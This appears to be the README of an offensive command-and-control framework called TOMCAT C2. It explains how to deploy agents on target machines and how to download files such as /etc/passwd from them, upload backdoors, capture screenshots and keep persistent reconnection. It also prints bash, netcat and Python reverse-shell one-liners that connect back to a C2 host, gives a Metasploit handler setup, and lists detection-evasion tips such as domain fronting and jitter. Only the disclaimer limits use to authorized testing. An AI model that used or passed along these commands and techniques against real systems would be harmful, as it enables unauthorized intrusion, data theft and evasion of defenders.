# TOMCAT C2 Framework

<div align="center">

```
 _____ ___  __  __  ___   _ _____   ___  ___ _____ _  _ ___ _____ 
|_   _/ _ \|  \/  |/ __| /_\_   _| | _ )/ _ \_   _| \| | __|_   _|
  | || (_) | |\/| | (__ / _ \| |   | _ \ (_) || | | .` | _|  | |  
  |_| \___/|_|  |_|\___/_/ \_\_|   |___/\___/ |_| |_|\_|___| |_|  
                                                                  
         < TOMCAT C2 Frameworks V2 - Command & Control >
```

**A Modern, Multi-Protocol Command and Control Framework**

[![Python Version](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
[![License](https://img.shields.io/badge/license-Educational-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows-lightgrey.svg)](README.md)

[Features](#-features) • [Installation](#-installation) • [Quick Start](#-quick-start) • [Documentation](#-documentation) • [Security](#-security)

</div>

---

## 📋 Table of Contents

- [Overview](#-overview)
- [Features](#-features)
- [Architecture](#-architecture)
- [Installation](#-installation)
- [Quick Start](#-quick-start)
- [Usage](#-usage)
  - [Server Modes](#server-modes)
  - [Agent Deployment](#agent-deployment)
  - [Command Reference](#command-reference)
- [File Operations](#-file-operations)
- [MTLS Configuration](#-mtls-configuration)
- [Multi-Protocol Support](#-multi-protocol-support)
- [Web Interface](#-web-interface)
- [Advanced Features](#-advanced-features)
- [Troubleshooting](#-troubleshooting)
- [Security Considerations](#-security-considerations)
- [Contributing](#-contributing)
- [Disclaimer](#-disclaimer)

---

## 🎯 Overview

TOMCAT C2 Framework V2 is a sophisticated command and control platform designed for security research, penetration testing, and red team operations. It provides a flexible, multi-protocol architecture that supports various connection types including custom encrypted agents, Meterpreter sessions, and reverse shells.

### Key Highlights

- 🔐 **Built-in MTLS Support** - Mutual TLS authentication for secure agent communication
- 🌐 **Multi-Protocol** - Handles TOMCAT agents, Meterpreter, and reverse shells simultaneously
- 📁 **Advanced File Operations** - Upload, download, and screenshot capabilities
- 💻 **Multiple Interfaces** - CLI, Web Panel, and API access
- 🎨 **Modern UI** - Enhanced terminal interface with auto-completion and history
- 🔄 **Cross-Platform** - Supports Linux and Windows agents

---

## ✨ Features

### Core Capabilities

| Feature | Description |
|---------|-------------|
| **Encrypted Communication** | Fernet-based encryption for all command/data transfer |
| **Session Management** | Multiple concurrent sessions with different protocols |
| **File Transfer** | Binary file upload/download without base64 overhead |
| **Screenshot Capture** | Automated screenshot retrieval from agents |
| **MTLS Authentication** | Certificate-based mutual authentication |
| **Auto-Reconnect** | Agents automatically reconnect on disconnection |
| **Process Management** | Start/stop/kill remote processes |
| **System Information** | Detailed victim system enumeration |

### Advanced Features

- **Multi-Protocol Server**: Accept TOMCAT agents, Meterpreter, and reverse shells on single port
- **Enhanced CLI**: Arrow key navigation, command history, auto-completion
- **Web Dashboard**: Real-time session monitoring and control
- **Flexible Command Syntax**: Case-insensitive commands with multiple formats
- **Session Persistence**: Agents reconnect automatically with retry logic
- **Rate Limiting**: Configurable connection rate limits and timeouts

---

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                     TOMCAT C2 Server                        │
├─────────────────────────────────────────────────────────────┤
│  ┌──────────────┐  ┌──────────────┐  ┌─────────────────┐  │
│  │   CLI Mode   │  │  Web Panel   │  │   API Server    │  │
│  └──────┬───────┘  └──────┬───────┘  └────────┬────────┘  │
│         │                  │                    │           │
│         └──────────────────┴────────────────────┘           │
│                            │                                │
│         ┌──────────────────┴──────────────────┐            │
│         │   Multi-Protocol Handler             │            │
│         │  ┌────────┬──────────┬────────────┐ │            │
│         │  │ TOMCAT │ Meterp.  │ RevShell   │ │            │
│         │  └────────┴──────────┴────────────┘ │            │
│         └──────────────────┬──────────────────┘            │
│                            │                                │
├────────────────────────────┼────────────────────────────────┤
│         Network Layer (TCP/SSL/MTLS)                        │
└────────────────────────────┼────────────────────────────────┘
                             │
          ┌──────────────────┴──────────────────┐
          │                                     │
    ┌─────▼──────┐                      ┌──────▼──────┐
    │   TOMCAT   │                      │   External  │
    │   Agent    │                      │  Sessions   │
    │            │                      │  (Meterp/   │
    │ • Windows  │                      │   Shell)    │
    │ • Linux    │                      └─────────────┘
    │ • MTLS     │
    └────────────┘
```

---

## 🚀 Installation

### Prerequisites

```bash
# Required
Python 3.8+
pip

# Optional (for full features)
scrot or gnome-screenshot  # Linux screenshots
pywin32                    # Windows screenshots
```

### Setup

1. **Clone Repository**
```bash
git clone https://github.com/yourusername/tomcat-c2.git
cd tomcat-c2
```

2. **Install Dependencies**
```bash
pip install -r requirements.txt
```

3. **Generate MTLS Certificates** (Optional)
```bash
cd Config/certs
./generate_certs.sh
```

4. **Configure Settings**
```bash
# Edit Config/config.json
{
  "ServerHost": "0.0.0.0",
  "ServerPort": 4444,
  "UseMTLS": false,
  "LogLevel": "INFO"
}
```

---

## ⚡ Quick Start

### 1. Start Server

**Basic Mode** (TOMCAT agents only):
```bash
./start.py -C
```

**Multi-Protocol Mode** (All connection types):
```bash
./start.py -C -m
```

**With MTLS** (Secure connections):
```bash
./start.py -C --mtls
```

**Full Features** (Multi-Protocol + MTLS):
```bash
./start.py -C -m --mtls
```

### 2. Deploy Agent

**Generate Agent**:
```bash
./start.py -G -o /tmp/agent.py
```

**Configure Agent**:
```python
ServerHost = "192.168.1.100"  # Your C2 server IP
ServerPort = 4444
UseMTLS = False  # Set to True if server uses MTLS
```

**Execute on Target**:
```bash
# Linux
chmod +x agent.py
./agent.py

# Windows
python agent.py
```

### 3. Interact with Session

```bash
# List sessions
sessions

# Connect to session
use 1

# Execute commands
whoami
pwd
sysinfo

# File operations
download /etc/passwd
upload exploit.sh /tmp/
screenshot

# Exit session
back
```

---

## 📖 Usage

### Server Modes

#### 1. CLI Mode (`-C`)
Interactive command-line interface with enhanced features.

```bash
./start.py -C
```

**Features:**
- Arrow key navigation (↑↓ for history, ←→ for editing)
- Tab completion for commands
- Command history
- Real-time session monitoring

**Commands:**
| Command | Description |
|---------|-------------|
| `sessions` | List all active sessions |
| `use <id>` | Interact with specific session |
| `exec <id> <cmd>` | Execute command on session |
| `logs` | View recent server logs |
| `status` | Show server status |
| `stats` | Display session statistics |
| `kill <id>` | Terminate session |
| `clear` | Clear screen |
| `help` | Show help menu |
| `exit` | Stop server and exit |

#### 2. Web Panel Mode (`-W`)
Web-based dashboard for session management.

```bash
./start.py -W
```

Access: `http://localhost:5000`

**Features:**
- Real-time session dashboard
- Command execution interface
- File upload/download
- Session logs viewer
- System information display

#### 3. Multi-Protocol Mode (`-m`)
Accept multiple connection types simultaneously.

```bash
./start.py -C -m
```

**Supported Protocols:**
- ✅ TOMCAT agents (encrypted)
- ✅ Meterpreter sessions
- ✅ Reverse shells (netcat, bash, etc.)

### Agent Deployment

#### Generate Custom Agent

```bash
# Basic agent
./start.py -G

# With custom settings
./start.py -G -H 192.168.1.100 -P 4444

# With MTLS
./start.py -G --mtls

# Save to file
./start.py -G -o /tmp/custom_agent.py
```

#### Agent Configuration

Edit these variables in the generated agent:

```python
class TomcatAgent:
    def __init__(
        self,
        ServerHost="192.168.1.100",  # C2 server IP
        ServerPort=4444,              # C2 server port
        UseMTLS=False,                # Enable MTLS
        ReconnectDelay=5,             # Seconds between reconnects
        ShellMode="Standard",         # Shell execution mode
    ):
```

### Command Reference

#### Session Commands (Inside `use <id>`)

**System Information:**
```bash
sysinfo          # Full system information
SYSTEMINFO       # Alias for sysinfo
```

**File Operations:**
```bash
download <remote_file>              # Download file from agent
DOWNLOAD <remote_file>              # Case-insensitive
download: <remote_file>             # Alternative syntax
dl <remote_file>                    # Shorthand

upload <local_file> <remote_path>   # Upload file to agent
UPLOAD <local_file> <remote_path>

screenshot                          # Capture screen
SCREENSHOT                          # Case-insensitive
```

**Process Management:**
```bash
STOPTASK        # Kill current running task
```

**Shell Commands:**
```bash
# Any command not matching above will execute as shell command
whoami
pwd
ls -la
cat /etc/passwd
```

---

## 📁 File Operations

### Download Files from Agent

**Syntax:**
```bash
download <filepath>
DOWNLOAD <filepath>
download: <filepath>
dl <filepath>
```

**Examples:**
```bash
# Linux
download /etc/passwd
download /home/user/document.pdf
dl /var/log/auth.log

# Windows
download C:\Users\Public\Desktop\file.txt
DOWNLOAD C:\Windows\System32\drivers\etc\hosts
```

**Output:**
```
[*] File command detected, checking response type...
[*] Agent sending file...
[*] Receiving: passwd (2847 bytes)
[+] File saved: Downloads/Agent_1/passwd
```

### Upload Files to Agent

**Syntax:**
```bash
upload <local_file> <remote_path>
```

**Examples:**
```bash
# Upload to Linux
upload exploit.sh /tmp/
upload payload.elf /home/user/

# Upload to Windows
upload backdoor.exe C:\Windows\Temp\
upload script.ps1 C:\Users\Public\
```

**Output:**
```
[*] Uploading backdoor.exe to C:\Windows\Temp\
[+] File uploaded: backdoor.exe
```

### Screenshot Capture

**Syntax:**
```bash
screenshot
SCREENSHOT
```

**Requirements:**
- **Linux**: `scrot` or `gnome-screenshot`
- **Windows**: Built-in (pywin32)

**Output:**
```
[*] File command detected, checking response type...
[*] Agent sending file...
[*] Receiving: screenshot_1771963135.png (384955 bytes)
[+] File saved: Downloads/Agent_1/screenshot_1771963135.png
```

**File Organization:**
```
Downloads/
├── Agent_1/
│   ├── screenshot_1771963135.png
│   ├── passwd
│   └── document.pdf
├── Agent_2/
│   └── screenshot_1771963200.png
└── Session_3/
    └── data.txt
```

---

## 🔐 MTLS Configuration

Mutual TLS (MTLS) provides certificate-based authentication between server and agents.

### Generate Certificates

```bash
cd Config/certs
./generate_certs.sh
```

This creates:
```
Config/certs/
├── ca-cert.pem       # Certificate Authority
├── ca-key.pem        # CA Private Key
├── server-cert.pem   # Server Certificate
├── server-key.pem    # Server Private Key
├── agent-cert.pem    # Agent Certificate (default)
└── agent-key.pem     # Agent Private Key (default)
```

### Server Configuration

**Start with MTLS:**
```bash
./start.py -C --mtls
```

**Config File:**
```json
{
  "UseMTLS": true,
  "ServerCertPath": "Config/certs/server-cert.pem",
  "ServerKeyPath": "Config/certs/server-key.pem",
  "CACertPath": "Config/certs/ca-cert.pem"
}
```

### Agent Configuration

**Set in Agent Code:**
```python
UseMTLS = True
AgentCertPath = "agent-cert.pem"
AgentKeyPath = "agent-key.pem"
CACertPath = "ca-cert.pem"
```

**Or Generate Agent with MTLS:**
```bash
./start.py -G --mtls -o agent_mtls.py
```

### Benefits of MTLS

✅ **Mutual Authentication** - Both server and agent verify each other
✅ **Certificate Pinning** - Prevents MITM attacks
✅ **Identity Verification** - CN (Common Name) identifies each agent
✅ **Encryption** - TLS 1.2+ encryption for all traffic
✅ **Non-Repudiation** - Certificate-based audit trail

### MTLS Session Example

```
[2026-02-25 08:34:58] ✔ Server listening on 0.0.0.0:4444
[2026-02-25 08:34:58] 🔑 Key: GEj5eqlLg6Mleq087lWde8H1DsRi...
[2026-02-25 08:35:10] [INFO] MTLS: Client Verified - CN: agent-hostname
[2026-02-25 08:35:10] ★ New [TOMCAT] SESSION-1: agent-hostname (Linux)
[2026-02-25 08:35:10]   ↳ IP=192.168.80.31  User=tom7  Host=TARGET
```

---

## 🌐 Multi-Protocol Support

TOMCAT C2 can handle multiple connection types on a single port.

### Supported Protocols

#### 1. TOMCAT Agents (Native)
**Features:**
- Fernet encryption
- JSON-based protocol
- File transfer support
- Auto-reconnect
- MTLS optional

**Detection:**
```
Server sends encryption key →
Agent sends JSON system info →
Server detects: TOMCAT
```

#### 2. Meterpreter Sessions
**Features:**
- Full Meterpreter functionality
- TLV packet protocol
- Seamless handoff to Metasploit

**Detection:**
```
Client sends TLV packet →
Server detects TLV structure →
Server detects: METERPRETER
```

**Usage:**
```bash
# In Metasploit
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST <C2_SERVER_IP>
set LPORT 4444
exploit
```

#### 3. Reverse Shells
**Features:**
- Raw TCP shell
- No encryption
- Compatible with netcat, bash, etc.

**Detection:**
```
Client sends shell prompt or data →
Not TLV, not JSON →
Server detects: REVERSE_SHELL
```

**Examples:**
```bash
# Bash reverse shell
bash -i >& /dev/tcp/<C2_IP>/4444 0>&1

# Netcat
nc -e /bin/bash <C2_IP> 4444

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<C2_IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Multi-Protocol Architecture

```
Port 4444 (Single Listener)
    │
    ├─ TOMCAT Agent    → [TOMCAT] SESSION-1
    │   └─ Encrypted, JSON handshake
    │
    ├─ Meterpreter     → [METERPRETER] SESSION-2
    │   └─ TLV packets
    │
    └─ Reverse Shell   → [SHELL] SESSION-3
        └─ Raw TCP
```

### Session Identification

```bash
sessions

ID  Type          Agent Name    OS       IP              User        Status
--  ------------  ------------  -------  --------------  ----------  --------
1   [TOMCAT]      agent-host    Linux    192.168.1.100   root        Online
2   [METERPRETER] N/A           Linux    192.168.1.101   www-data    Online
3   [SHELL]       N/A           Linux    192.168.1.102   ubuntu      Online
```

---

## 🖥️ Web Interface

### Start Web Panel

```bash
./start.py -W
# or
./start.py -C -W  # CLI + Web simultaneously
```

### Access Dashboard

```
URL: http://localhost:5000
Default Port: 5000
```

### Features

#### 1. **Dashboard**
- Real-time session count
- Active/inactive sessions
- System overview

#### 2. **Session Management**
- View all sessions
- Filter by type/status
- Quick actions (kill, interact)

#### 3. **Command Execution**
- Interactive terminal
- Command history
- Output display

#### 4. **File Manager**
- Upload files to agents
- Download files from agents
- Screenshot viewer

#### 5. **Logs Viewer**
- Real-time log streaming
- Filter by level
- Export logs

---

## 🔧 Advanced Features

### 1. Enhanced CLI

**Arrow Key Navigation:**
- ↑ / ↓ : Command history
- ← / → : Cursor movement
- Tab : Auto-completion
- Ctrl+R : Reverse search
- Ctrl+C : Cancel input
- Ctrl+D : Exit

**Auto-Completion:**
```bash
# Type and press Tab
ses<Tab>     → sessions
dow<Tab>     → download
scr<Tab>     → screenshot
```

**Command History:**
```bash
# Separate history for:
- Main CLI commands
- Interactive session commands
```

### 2. Flexible Command Syntax

All file commands support multiple formats:

```bash
# All these work:
download file.txt
DOWNLOAD file.txt
Download file.txt
download: file.txt
DOWNLOAD: file.txt
download:file.txt
dl file.txt
```

### 3. Session Badges

Visual indicators for session types:

```
[TOMCAT]       - TOMCAT agent (encrypted)
[METERPRETER]  - Meterpreter session
[SHELL]        - Raw reverse shell
[UNKNOWN]      - Unidentified connection
```

### 4. Auto-Reconnect

Agents automatically reconnect on disconnection:

```python
ReconnectDelay = 5        # Seconds between attempts
MaxAttempts = 1000000     # Maximum reconnect attempts
```

### 5. Error Handling

All commands handle errors gracefully:

```bash
# File not found
download NOTEXIST.txt
→ [!] Error: Path is not a file

# Connection lost
whoami
→ [!] Error: Agent disconnected

# Invalid syntax
upload file.txt
→ [!] Error: Usage: upload <local_file> <remote_path>
```

---

## 🐛 Troubleshooting

### Common Issues

#### 1. Agent Can't Connect

**Symptom:**
```
[-] Connection Failed: Connection refused
```

**Solutions:**
- Verify server is running: `netstat -tulpn | grep 4444`
- Check firewall rules: `iptables -L`
- Verify IP/Port in agent configuration
- Check network connectivity: `telnet <server_ip> 4444`

#### 2. SSL/MTLS Errors

**Symptom:**
```
[-] Connection Failed: [SSL: RECORD_LAYER_FAILURE]
```

**Solutions:**
- Ensure server and agent MTLS settings match
- Verify certificates exist and are valid
- Check certificate paths are correct
- Regenerate certificates if corrupted

#### 3. File Download Hangs

**Symptom:**
```
[*] File command detected, checking response type...
[Server hangs...]
```

**Solutions:**
- File might not exist on agent
- Check agent logs for errors
- Verify file permissions
- Try with smaller file first

#### 4. Screenshot Fails

**Symptom:**
```
[!] Error: Screenshot failed - no capture tool available
```

**Solutions:**
- **Linux**: Install `scrot` or `gnome-screenshot`
  ```bash
  apt install scrot
  # or
  apt install gnome-screenshot
  ```
- **Windows**: Install `pywin32`
  ```bash
  pip install pywin32
  ```

#### 5. Command Not Found

**Symptom:**
```
/bin/sh: 1: sysinfo: not found
```

**Solutions:**
- Special commands are case-sensitive in some modes
- Try: `SYSINFO` (uppercase)
- Update agent to latest version
- Check agent logs for command handling

### Debug Mode

Enable verbose logging:

```bash
./start.py -C --debug
```

Or in config:
```json
{
  "LogLevel": "DEBUG"
}
```

### Log Files

```
Logs/
├── server.log         # Server events
├── sessions.log       # Session activity
└── errors.log         # Error messages
```

---

## 🔒 Security Considerations

### ⚠️ Important Security Notes

1. **Educational Purpose Only**
   - This tool is for authorized security testing only
   - Unauthorized use is illegal
   - Always obtain proper authorization

2. **Network Security**
   - Use MTLS in production
   - Consider VPN/tunneling for C2 traffic
   - Implement IP whitelisting if possible

3. **Operational Security**
   - Change default ports
   - Use strong encryption keys
   - Rotate certificates regularly
   - Monitor for detection

4. **Detection Risks**
   - C2 traffic may trigger IDS/IPS
   - Consider domain fronting or encrypted tunnels
   - Implement jitter/delay in communications

### Best Practices

✅ **DO:**
- Use MTLS for all production deployments
- Change default configurations
- Monitor server logs regularly
- Keep software updated
- Use unique certificates per agent
- Implement proper access controls

❌ **DON'T:**
- Use on networks without authorization
- Leave default credentials
- Ignore security warnings
- Deploy without proper testing
- Share certificates between agents
- Store sensitive data unencrypted

### Secure Deployment Checklist

- [ ] Generated unique MTLS certificates
- [ ] Changed default port
- [ ] Configured firewall rules
- [ ] Enabled logging
- [ ] Tested in isolated environment
- [ ] Obtained proper authorization
- [ ] Documented deployment
- [ ] Configured secure backup
- [ ] Implemented access controls
- [ ] Set up monitoring

---

## 🤝 Contributing

We welcome contributions! Please follow these guidelines:

### Development Setup

```bash
# Fork and clone
git clone https://github.com/yourusername/tomcat-c2.git
cd tomcat-c2

# Create branch
git checkout -b feature/your-feature

# Make changes and test
python -m pytest tests/

# Commit and push
git commit -m "Add your feature"
git push origin feature/your-feature
```

### Code Style

- Follow PEP 8 guidelines
- Use meaningful variable names
- Add docstrings to functions
- Comment complex logic
- Keep functions focused and small

### Testing

```bash
# Run tests
python -m pytest tests/

# Run with coverage
python -m pytest --cov=. tests/
```

### Pull Request Process

1. Update documentation
2. Add tests for new features
3. Ensure all tests pass
4. Update CHANGELOG.md
5. Submit PR with clear description

---

## 📄 License

This project is licensed under the Educational License - see the [LICENSE](LICENSE) file for details.

### Educational License Terms

- ✅ Use for authorized security research
- ✅ Use for penetration testing with permission
- ✅ Use for educational purposes
- ❌ Unauthorized access to systems
- ❌ Malicious use
- ❌ Distribution for illegal purposes

---

## ⚠️ Disclaimer

```
IMPORTANT: READ CAREFULLY

This software is provided for educational and authorized security 
testing purposes only. Unauthorized access to computer systems is 
illegal under local, national, and international law.

The developers assume NO LIABILITY and are NOT responsible for any 
misuse or damage caused by this program. It is the end user's 
responsibility to obey all applicable local, state, federal, and 
international laws.

By using this software, you agree that:
- You have obtained proper authorization
- You will only use it on systems you own or have explicit permission to test
- You understand the legal implications
- You accept full responsibility for your actions

USE AT YOUR OWN RISK.
```

---

## 📞 Support

### Community

- **GitHub Issues**: [Report bugs](https://github.com/yourusername/tomcat-c2/issues)
- **Discussions**: [Ask questions](https://github.com/yourusername/tomcat-c2/discussions)
- **Wiki**: [Documentation](https://github.com/yourusername/tomcat-c2/wiki)

### Contact

- **Email**: security@example.com
- **Twitter**: [@tomcatc2](https://twitter.com/tomcatc2)

---

## 🙏 Acknowledgments

- Inspired by various C2 frameworks in the security community
- Special thanks to all contributors
- Built with Python and love for security research

---

## 📊 Project Stats

![Stars](https://img.shields.io/github/stars/yourusername/tomcat-c2?style=social)
![Forks](https://img.shields.io/github/forks/yourusername/tomcat-c2?style=social)
![Issues](https://img.shields.io/github/issues/yourusername/tomcat-c2)
![Last Commit](https://img.shields.io/github/last-commit/yourusername/tomcat-c2)

---

<div align="center">

**Made with ❤️ for the Security Community**

[⬆ Back to Top](#-tomcat-c2-framework-v2)

</div>
